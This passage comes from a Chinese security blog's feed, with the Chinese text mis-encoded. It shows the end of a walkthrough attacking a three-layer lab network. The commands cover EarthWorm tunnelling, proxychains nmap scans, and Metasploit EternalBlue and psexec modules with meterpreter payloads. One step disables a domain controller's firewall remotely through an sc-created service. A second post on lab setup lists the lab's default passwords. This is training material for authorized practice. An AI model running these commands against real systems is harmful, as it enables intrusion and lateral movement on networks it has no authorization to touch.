src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2010.56.28.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2010.58.12.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°999ç«¯å£å·²ç»å¼€å¯äº†ç›‘å¬ã€‚</p><h3 id="10-2-3-DMZåŒºçš„web1ä¸»æœº"><a href="#10-2-3-DMZåŒºçš„web1ä¸»æœº" class="headerlink" title="10.2.3 DMZåŒºçš„web1ä¸»æœº"></a>10.2.3 DMZåŒºçš„web1ä¸»æœº</h3><p>æœ€åï¼Œåœ¨DMZåŒºåŸŸçš„Ubuntu 18ä¸Šä¼ ew_for_linux64å¹¶åˆ©ç”¨lcx_slaveæ–¹å¼ï¼Œå°†æ”»å‡»æœºçš„1235ç«¯å£ä¸ç¬¬äºŒå±‚ç½‘ç»œWindows 7çš„999ç«¯å£è¿æ¥èµ·æ¥ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> lcx_slave <span class="token parameter variable">-d</span> <span class="token number">192.168</span>.1.7 <span class="token parameter variable">-e</span> <span class="token number">1235</span> <span class="token parameter variable">-f</span> <span class="token number">192.168</span>.52.30 <span class="token parameter variable">-g</span> <span class="token number">999</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2010.59.36.png" style="zoom:50%;"><h3 id="10-2-4-é…ç½®proxychains"><a href="#10-2-4-é…ç½®proxychains" class="headerlink" title="10.2.4 é…ç½®proxychains"></a>10.2.4 é…ç½®proxychains</h3><p>è®¾ç½®proxychainsç­‰ä»£ç†å·¥å…·ï¼Œé€šè¿‡è®¿é—®æ”»å‡»æœºçš„1090ç«¯å£æ¥ä½¿ç”¨æ¶è®¾åœ¨ç¬¬äºŒå±‚ç½‘ç»œWindowsä¸»æœºä¸Šçš„socksä»£ç†æœåŠ¡ï¼Œæ¥è¿›å…¥ç¬¬ä¸‰å±‚ç½‘ç»œã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.00.22.png" style="zoom:50%;"><h2 id="10-3-åŸºäºéš§é“ç”¨nampæ‰«ææ ¸å¿ƒç½‘"><a href="#10-3-åŸºäºéš§é“ç”¨nampæ‰«ææ ¸å¿ƒç½‘" class="headerlink" title="10.3 åŸºäºéš§é“ç”¨nampæ‰«ææ ¸å¿ƒç½‘"></a>10.3 åŸºäºéš§é“ç”¨nampæ‰«ææ ¸å¿ƒç½‘</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 nmap <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sT</span> <span class="token parameter variable">-O</span> <span class="token number">192.168</span>.93.40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.02.05.png" style="zoom:40%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.12.42.png" style="zoom:40%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.33.16.png" style="zoom:50%;"><p>ä¸Šé¢æ˜¯nmapçš„æ‰«æç»“æœï¼Œ445ç«¯å£å¼€å¯ï¼Œå¯ä»¥è€ƒè™‘å°è¯•ä½¿ç”¨ms17_010è¿›è¡Œæ¸—é€ã€‚</p><h1 id="åä¸€ã€ä¸‰å±‚æ ¸å¿ƒç½‘æ¸—é€"><a href="#åä¸€ã€ä¸‰å±‚æ ¸å¿ƒç½‘æ¸—é€" class="headerlink" title="åä¸€ã€ä¸‰å±‚æ ¸å¿ƒç½‘æ¸—é€"></a>åä¸€ã€ä¸‰å±‚æ ¸å¿ƒç½‘æ¸—é€</h1><h2 id="11-1-æ°¸æ’ä¹‹è“"><a href="#11-1-æ°¸æ’ä¹‹è“" class="headerlink" title="11.1 æ°¸æ’ä¹‹è“"></a>11.1 æ°¸æ’ä¹‹è“</h2><h3 id="11-1-1-æ¼æ´æ£€æµ‹"><a href="#11-1-1-æ¼æ´æ£€æµ‹" class="headerlink" title="11.1.1 æ¼æ´æ£€æµ‹"></a>11.1.1 æ¼æ´æ£€æµ‹</h3><p>é€šè¿‡æ·»åŠ è·¯ç”±å°†msfå¸¦å…¥æ ¸å¿ƒç½‘ä¹‹åï¼Œå¯ä»¥ä½¿ç”¨msfçš„æ‰«ææ¨¡å—æ£€æµ‹å†…ç½‘æ˜¯å¦å­˜åœ¨æ°¸æ’ä¹‹è“æ¼æ´ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auciliary/scanner/smb/smb_ms17_010<span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.93.30<span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.21.01.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.21.50.png" style="zoom:50%;"><p>é€šè¿‡æ£€æµ‹å‘ç°ï¼Œ93.30 ã€93.40è¿™ä¸¤å°ä¸»æœºå‡å­˜åœ¨æ°¸æ’ä¹‹è“æ¼æ´ã€‚</p><h3 id="11-1-2-æ¼æ´åˆ©ç”¨"><a href="#11-1-2-æ¼æ´åˆ©ç”¨" class="headerlink" title="11.1.2 æ¼æ´åˆ©ç”¨"></a>11.1.2 æ¼æ´åˆ©ç”¨</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">------------------use exploit/windows/smb/ms17_010_eternalblue<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.93.40<span class="token builtin class-name">set</span> LHOST <span class="token number">172.20</span>.10.4<span class="token builtin class-name">set</span> LPORT <span class="token number">8877</span>msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit----------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šé¢è¿™å¥—æµç¨‹èµ°ä¸‹æ¥ï¼Œåˆ©ç”¨å¤±è´¥äº†ã€‚</p><p>ä½¿ç”¨ä¸‹é¢çš„å‚æ•°è®¾ç½®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">setg Proxies socks5:127.0.0.1:1090use exploit/windows/smb/ms17_010_eternalblue<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/bind_tcp<span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.93.40<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.93.40<span class="token builtin class-name">set</span> LPORT <span class="token number">8877</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.40.45.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.41.11.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.42.05.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.43.10.png" alt="æˆªå±2025-01-20 11.43.10" style="zoom:50%;"><p>æˆåŠŸæ‹¿ä¸‹ä¸‰å±‚æ ¸å¿ƒç½‘çš„ä¸»æœºPC2ï¼</p><h1 id="åäºŒã€æ”»å‡»åŸŸæ§"><a href="#åäºŒã€æ”»å‡»åŸŸæ§" class="headerlink" title="åäºŒã€æ”»å‡»åŸŸæ§"></a>åäºŒã€æ”»å‡»åŸŸæ§</h1><p>å…¶å®ï¼Œåœ¨ä¸Šä¸€å°èŠ‚å·²ç»æ¢æµ‹åˆ°93.30è¿™å°ä¸»æœºå­˜åœ¨ms17-010æ¼æ´äº†ã€‚å¯ä»¥ç›´æ¥å°è¯•ä½¿ç”¨ms12-010æ‹¿ä¸‹åŸŸæ§åˆ¶å™¨ï¼Œè¿™é‡Œå…ˆå°è¯•ç›´æ¥ç™»å½•ã€‚</p><h2 id="12-1-psexecç™»é™†"><a href="#12-1-psexecç™»é™†" class="headerlink" title="12.1 psexecç™»é™†"></a>12.1 psexecç™»é™†</h2><p>ç°åœ¨æˆ‘ä»¬æ‰‹å¤´å·²ç»æœ‰åŸŸç®¡ç†å¯†ç (Whoami2021)äº†ï¼Œå¯ä»¥å°è¯•ç›´æ¥psexecç™»é™†ã€‚</p><p><code>exploit/windows/smb/psexec</code> æ˜¯ Metasploit æ¡†æ¶ä¸­çš„ä¸€ä¸ªæ¨¡å—ï¼Œç”¨äºé€šè¿‡ SMB æœåŠ¡åˆ©ç”¨ç›®æ ‡ä¸»æœºçš„æ¼æ´ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚è¯¥æ¨¡å—é€šå¸¸åˆ©ç”¨ Windows çš„ <code>psexec</code> åŠŸèƒ½ï¼Œé€šè¿‡æœ‰æ•ˆçš„ç”¨æˆ·å‡­æ®åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤æˆ–è·å– Meterpreter ä¼šè¯ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/windows/smb/psexec<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.93.30<span class="token builtin class-name">set</span> SMBUser administrator<span class="token builtin class-name">set</span> SMBPass Whoami2021<span class="token builtin class-name">set</span> payload windows/meterpreter/bind_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.93.30<span class="token builtin class-name">set</span> lport <span class="token number">7777</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2013.37.45.png" style="zoom:50%;"><p>ç™»å½•å¤±è´¥äº†ï¼Œå¯èƒ½æ˜¯é˜²ç«å¢™çš„åŸå› ã€‚</p><h2 id="12-2-å…³é—­åŸŸæ§é˜²ç«å¢™"><a href="#12-2-å…³é—­åŸŸæ§é˜²ç«å¢™" class="headerlink" title="12.2 å…³é—­åŸŸæ§é˜²ç«å¢™"></a>12.2 å…³é—­åŸŸæ§é˜²ç«å¢™</h2><p>æ—¢ç„¶æˆ‘ä»¬æœ‰åŸŸæ§åˆ¶å™¨çš„å¯†ç ï¼Œä¹Ÿæ‹¿ä¸‹äº†åŸŸå†…ä¸»æœºPC2çš„systemæƒé™ï¼Œå¹¶ä¸”ç›®æ ‡ç³»ç»Ÿå­˜åœ¨IPCå…±äº«ï¼Œæˆ‘ä»¬å¯ä»¥ä»PC2è¿œç¨‹å…³é—­åŸŸæ§çš„é˜²ç«å¢™ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.93.30<span class="token punctuation">\</span>ipc$ <span class="token string">"Whoami2021"</span> /user:<span class="token string">"Administrator"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2013.43.44.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2013.44.50.png" style="zoom:40%;"><p>ç„¶åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œä½¿ç”¨scè¿œç¨‹åœ¨åŸŸåˆ¶å™¨ï¼ˆ192.168.93.30ï¼‰ä¸Šåˆ›å»ºæœåŠ¡å…³é—­é˜²ç«å¢™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sc <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.93.30 create unablefirewall <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">"netsh advfirewall set allprofiles state off"</span>sc <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.93.30 start unablefirewall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2013.48.25.png" style="zoom:50%;"><h2 id="12-3-é‡æ–°ç™»å½•"><a href="#12-3-é‡æ–°ç™»å½•" class="headerlink" title="12.3 é‡æ–°ç™»å½•"></a>12.3 é‡æ–°ç™»å½•</h2><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2013.50.12.png" style="zoom:50%;"><p>æˆåŠŸè·å–meterpterè¿æ¥ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2013.52.48.png" style="zoom:50%;"><p>æˆåŠŸæ‹¿ä¸‹åŸŸæ§ï¼âœ…</p><h1 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å…³äºæœ¬æ¬¡ä¸‰å±‚ç½‘ç»œé¶åœºçš„ç»¼åˆæ¸—é€å®æˆ˜ï¼Œæ¶‰åŠåˆ°çš„æŠ€æœ¯æ¯”è¾ƒå…¨é¢ï¼Œä»å¤–ç½‘æ‰“ç‚¹ã€å†…ç½‘æ¨ªå‘åˆ°æ”»å‡»åŸŸæ§ã€‚ä¸‹é¢æ€»ç»“ä¸€ä¸‹ï¼š</p><ul><li><p>æ‹¿ä¸‹æŸä¸ªåŒºåŸŸçš„æŸä¸ªä¸»æœºæ‰€æ¶‰åŠçš„æŠ€æœ¯ç‚¹ï¼š</p><ul><li><p>DMZ-web1ï¼šRedisæœªæˆæƒè®¿é—®getshell</p></li><li><p>äºŒå±‚-web2ï¼šLaravel RCE CVE-2021-3129ã€phpåå¼¹shellã€suidæƒé™æå‡ã€Dockerå®¹å™¨é€ƒé€¸ã€‚</p></li><li><p>äºŒå±‚-PC1ï¼šéš§é“æ­å»ºã€é€šè¾¾OA RCE </p></li><li><p>ä¸‰å±‚-PC2ï¼šéš§é“æ­å»ºã€ms17-010</p></li><li><p>ä¸‰å±‚-DCï¼šsmb/psexec</p></li></ul></li><li><p>æ‰€ä½¿ç”¨çš„é‡ç‚¹å·¥å…·:</p><ul><li><p>nmap</p></li><li><p>CVE-2021-3129 POC</p></li><li><p>èšå‰‘</p></li><li><p>Metasploit Framework</p></li><li><p>Earthworm</p></li><li><p>proxychains</p></li><li><p>Godzilla</p></li><li><p>msfvenom</p></li><li><p>kiwi</p></li><li><p>Tongda_scan</p></li></ul></li></ul><p>å¾ˆå¤šæŠ€æœ¯éƒ½æ˜¯ç¬¬ä¸€æ¬¡ç”¨ï¼Œå†æ¥å†åŠ±ï¼</p>]]></content>
      
      
      <categories>
          
          <category> ç»¼åˆæ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ”»é˜² </tag>
            
            <tag> éš§é“æ­å»º </tag>
            
            <tag> ç»¼åˆæ¸—é€ </tag>
            
            <tag> åŸŸæ¸—é€ </tag>
            
            <tag> WHOAMIé¶åœº </tag>
            
            <tag> å†…ç½‘æ¨ªå‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸‰å±‚ç½‘ç»œåŸŸæ¸—é€é¶åœºï¼ˆWHOAMIIï¼‰æ­å»º</title>
      <link href="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/"/>
      <url>/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€é¶åœºç¯å¢ƒç®€ä»‹"><a href="#ä¸€ã€é¶åœºç¯å¢ƒç®€ä»‹" class="headerlink" title="ä¸€ã€é¶åœºç¯å¢ƒç®€ä»‹"></a>ä¸€ã€é¶åœºç¯å¢ƒç®€ä»‹</h1><p>é¶åœºä¸‹è½½åœ°å€ï¼š<a href="https://pan.baidu.com/s/1X5UQ66sUi-UphnXWs9zFuA">https://pan.baidu.com/s/1X5UQ66sUi-UphnXWs9zFuA</a> æå–ç : 6777 ã€27.8 GBã€‘</p><h2 id="1-1-äº”é¶æœº-ä¸‰å±‚ç½‘ç»œç¯å¢ƒ"><a href="#1-1-äº”é¶æœº-ä¸‰å±‚ç½‘ç»œç¯å¢ƒ" class="headerlink" title="1.1 äº”é¶æœº+ä¸‰å±‚ç½‘ç»œç¯å¢ƒ"></a>1.1 äº”é¶æœº+ä¸‰å±‚ç½‘ç»œç¯å¢ƒ</h2><p>1ï¼‰DMZåŒºï¼šIPæ®µä¸º192.168.1.1/24 ã€åç»­å…·ä½“æ­å»ºæ—¶æ ¹æ®å…·ä½“æƒ…å†µæœ‰æ‰€å˜åŠ¨å˜åŠ¨ï¼Œè·Ÿç‰©ç†æœºæ‰€å¤„çš„ç¯å¢ƒç›¸å…³ã€‚ã€‘</p><p>2ï¼‰ç¬¬äºŒå±‚ç½‘ç»œç¯å¢ƒï¼šIPæ®µä¸º192.168.52.1/24 </p><p>3ï¼‰ç¬¬ä¸‰å±‚ç½‘ç»œç¯å¢ƒï¼šIPæ®µä¸º192.168.93.1/24</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2009.45.39.png" alt="é¶åœºç½‘ç»œæ‹“æ‰‘ç»“æ„" style="zoom:35%;"><h1 id="äºŒã€é¶åœºåŸºç¡€ç¯å¢ƒæ­å»º"><a href="#äºŒã€é¶åœºåŸºç¡€ç¯å¢ƒæ­å»º" class="headerlink" title="äºŒã€é¶åœºåŸºç¡€ç¯å¢ƒæ­å»º"></a>äºŒã€é¶åœºåŸºç¡€ç¯å¢ƒæ­å»º</h1><h2 id="2-1-VMwareçš„ä¸‰ç§ç½‘ç»œæ¨¡å¼"><a href="#2-1-VMwareçš„ä¸‰ç§ç½‘ç»œæ¨¡å¼" class="headerlink" title="2.1  VMwareçš„ä¸‰ç§ç½‘ç»œæ¨¡å¼"></a>2.1  VMwareçš„ä¸‰ç§ç½‘ç»œæ¨¡å¼</h2><blockquote><p>WMwareçš„ä¸‰ç§ç½‘ç»œæ¨¡å¼ï¼š</p><ol><li><strong>æ¡¥æ¥æ¨¡å¼ï¼ˆBridgedï¼‰</strong>ï¼šåœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œè™šæ‹Ÿæœºç›´æ¥è¿æ¥åˆ°å®¿ä¸»æœºæ‰€åœ¨çš„ç‰©ç†ç½‘ç»œä¸­ï¼Œå°±åƒå®ƒæ˜¯è¯¥ç½‘ç»œä¸­çš„å¦ä¸€å°ç‹¬ç«‹è®¡ç®—æœºä¸€æ ·ã€‚è™šæ‹Ÿæœºå’Œå®¿ä¸»æœºåœ¨åŒä¸€ä¸ªç‰©ç†ç½‘ç»œä¸Šæ‹¥æœ‰å¹³ç­‰çš„åœ°ä½ï¼Œå¹¶ä¸”å¯ä»¥å„è‡ªè·å¾—ç‹¬ç«‹çš„IPåœ°å€ã€‚è™šæ‹Ÿæœºé€šå¸¸é€šè¿‡DHCPæœåŠ¡å™¨è‡ªåŠ¨è·å–IPåœ°å€ã€å­ç½‘æ©ç ã€é»˜è®¤ç½‘å…³å’ŒDNSæœåŠ¡å™¨ä¿¡æ¯ï¼Œå¦‚æœæ²¡æœ‰å¯ç”¨çš„DHCPæœåŠ¡å™¨ï¼Œåˆ™éœ€è¦æ‰‹åŠ¨é…ç½®é™æ€IPåœ°å€ã€‚ç”±äºè™šæ‹Ÿæœºç›´æ¥è¿æ¥åˆ°ç‰©ç†ç½‘ç»œï¼Œå…¶ä»–ç½‘ç»œè®¾å¤‡å¯ä»¥çœ‹åˆ°å¹¶ç›´æ¥ä¸è™šæ‹Ÿæœºé€šä¿¡ï¼Œå°±å¦‚åŒå®ƒä»¬æ˜¯ä¸€å°å®ä½“æœºå™¨ã€‚</li><li><strong>NATæ¨¡å¼ï¼ˆç½‘ç»œåœ°å€è½¬æ¢æ¨¡å¼ï¼‰</strong>ï¼šNATæ¨¡å¼é€šè¿‡è™šæ‹ŸNATè®¾å¤‡å’Œè™šæ‹ŸDHCPæœåŠ¡å™¨ï¼Œä½¿å¾—è™šæ‹Ÿæœºå¯ä»¥è”ç½‘ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œè™šæ‹Ÿæœºé€šè¿‡å®¿ä¸»æœºè®¿é—®å¤–éƒ¨ç½‘ç»œï¼Œè™šæ‹Ÿæœºçš„ç½‘ç»œæµé‡ä¼šç»è¿‡å®¿ä¸»æœºçš„NATè®¾å¤‡è¿›è¡Œåœ°å€è½¬æ¢ã€‚è™šæ‹Ÿæœºå…±äº«å®¿ä¸»æœºçš„IPåœ°å€æ¥è®¿é—®å¤–éƒ¨ç½‘ç»œï¼Œå› æ­¤å®ƒä»¬åœ¨å¤–éƒ¨ç½‘ç»œä¸Šä¸å…·æœ‰ç‹¬ç«‹çš„IPåœ°å€ã€‚è¿™ç§æ¨¡å¼é€‚åˆäºIPåœ°å€èµ„æºæœ‰é™çš„ç¯å¢ƒï¼Œå¹¶ä¸”å¯ä»¥æä¾›ä¸€å®šç¨‹åº¦çš„ç½‘ç»œå®‰å…¨ã€‚</li><li><strong>ä»…ä¸»æœºæ¨¡å¼ï¼ˆHost-Onlyï¼‰</strong>ï¼šä»…ä¸»æœºæ¨¡å¼åˆ›å»ºäº†ä¸€ä¸ªå®Œå…¨åŒ…å«åœ¨å®¿ä¸»æœºä¸­çš„ä¸“ç”¨ç½‘ç»œï¼Œè™šæ‹Ÿæœºä¸å®¿ä¸»æœºä¹‹é—´çš„ç½‘ç»œè¿æ¥ä»…å¯¹å®¿ä¸»æœºå¯è§ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œè™šæ‹Ÿæœºä¸èƒ½ç›´æ¥è®¿é—®å¤–éƒ¨ç½‘ç»œï¼Œä½†å¯ä»¥ä¸å®¿ä¸»æœºè¿›è¡Œé€šä¿¡ã€‚å¦‚æœéœ€è¦ï¼Œå¯ä»¥é€šè¿‡é…ç½®é¢å¤–çš„ç½‘ç»œè®¾å¤‡ï¼ˆå¦‚è™šæ‹Ÿè·¯ç”±å™¨ï¼‰æ¥å®ç°è™šæ‹Ÿæœºä¹‹é—´çš„é€šä¿¡ã€‚</li></ol><p>â€‹    å½“æˆ‘ä»¬å®‰è£… VMware æ—¶ï¼ŒVMware ä¼šè‡ªåŠ¨ä¸º 3 ç§ç½‘ç»œè¿æ¥æ¨¡å¼å„è‡ªåˆ›å»º 1 ä¸ªè™šæ‹Ÿæœºç½‘ç»œ**ï¼šVMnet0 (æ¡¥æ¥æ¨¡å¼)<strong>ã€</strong>VMnet8 (NATæ¨¡å¼)<strong>ã€</strong>VMnet1 (ä»…ä¸»æœºæ¨¡å¼)**ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ ¹æ®éœ€è¦è‡ªè¡Œåˆ›å»ºæ›´å¤šçš„è™šæ‹Ÿç½‘ç»œã€‚VMware çš„è™šæ‹Ÿç½‘ç»œéƒ½æ˜¯ä»¥ â€œVMnet+æ•°å­—â€ çš„å½¢å¼æ¥å‘½åçš„ï¼Œä¾‹å¦‚ VMnet0ã€VMnet1ã€VMnet2â€¦â€¦ä»¥æ­¤ç±»æ¨ï¼Œåœ¨ Linux ç³»ç»Ÿçš„ä¸»æœºä¸Šï¼Œè™šæ‹Ÿç½‘ç»œçš„åç§°å‡é‡‡ç”¨å°å†™å½¢å¼ï¼Œä¾‹å¦‚ vmnet0 ã€‚</p><p>â€‹    è™šæ‹Ÿæœºä¸Šçš„ç½‘ç»œè¿æ¥å›¾ç¤ºï¼š</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2009.51.21.png" style="zoom:50%;"></blockquote><p>åœ¨Vmwareä¸­æ–°å¢ä¸¤ä¸ªè™šæ‹Ÿç½‘å¡VMnet8ï¼ˆå†…ç½®çš„NATè™šæ‹Ÿç½‘ç»œï¼‰ã€VMnet14ã€‚</p><p>VMnet8è®¾ä¸ºé»˜è®¤çš„NATæ¨¡å¼ï¼ŒIPæ®µè®¾ä¸º192.168.52.0/24ï¼›</p><p>VMnet14è®¾ä¸ºä»…ä¸»æœºæ¨¡å¼ï¼ŒIPæ®µè®¾ä¸º192.168.93.0/24ï¼š</p><p>æ³¨æ„ï¼šVMnet8ä¸ºVMwareè®¾ç½®çš„é»˜è®¤NATæ¨¡å¼çš„è™šæ‹Ÿç½‘æ®µï¼Œå¯èƒ½å…¶IPåœ°å€æ®µå’Œé¶åœºç¯å¢ƒæ‰€è¦æ±‚çš„ä¸ä¸€è‡´ï¼Œå¯ä»¥åœ¨è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨ä¸­ä¿®æ”¹ï¼ˆwindowsï¼‰ã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2009.55.13.png" style="zoom:50%;"><p>åœ¨macç³»ç»Ÿä¸­ï¼Œç”±äºè™šæ‹Ÿç½‘ç»œéƒ½æ˜¯vmnetï¼ˆå°å†™ï¼‰+æ•°å­—ï¼Œæ‰€ä»¥è·Ÿé¶æœºé¢„è®¾çš„ç½‘å¡ä¸åŒ¹é…ï¼Œéœ€è¦é‡æ–°æ­å»ºè™šæ‹Ÿç½‘ç»œå¹¶é…ç½®å„ä¸ªé¶æœºçš„ç½‘å¡ï¼Œè€Œä¸æ˜¯ä»…ä»…è®¾ç½®VMnet8å’ŒVMnet14è™šæ‹Ÿç½‘ç»œã€‚</p><h2 id="2-2-è™šæ‹Ÿæœºå’Œç›¸å…³ç³»ç»Ÿçš„è´¦æˆ·å¯†ç "><a href="#2-2-è™šæ‹Ÿæœºå’Œç›¸å…³ç³»ç»Ÿçš„è´¦æˆ·å¯†ç " class="headerlink" title="2.2 è™šæ‹Ÿæœºå’Œç›¸å…³ç³»ç»Ÿçš„è´¦æˆ·å¯†ç "></a>2.2 è™šæ‹Ÿæœºå’Œç›¸å…³ç³»ç»Ÿçš„è´¦æˆ·å¯†ç </h2><p>web 1ï¼š</p><ul><li>ubuntuï¼šweb2021</li></ul><p>web 2ï¼š</p><ul><li>ubuntuï¼šubuntu</li></ul><p>åŸŸç”¨æˆ·è´¦æˆ·å’Œå¯†ç å¦‚ä¸‹ï¼š</p><ul><li>Administratorï¼šWhoami2021</li><li>whoamiï¼šWhoami2021 </li><li>bunnyï¼šBunny2021 ã€PC1ã€‘</li><li>moretzï¼šMoretz2021</li></ul><h2 id="2-3-è™šæ‹Ÿæœºæ— æ³•å¯åŠ¨é—®é¢˜è§£å†³"><a href="#2-3-è™šæ‹Ÿæœºæ— æ³•å¯åŠ¨é—®é¢˜è§£å†³" class="headerlink" title="2.3 è™šæ‹Ÿæœºæ— æ³•å¯åŠ¨é—®é¢˜è§£å†³"></a>2.3 è™šæ‹Ÿæœºæ— 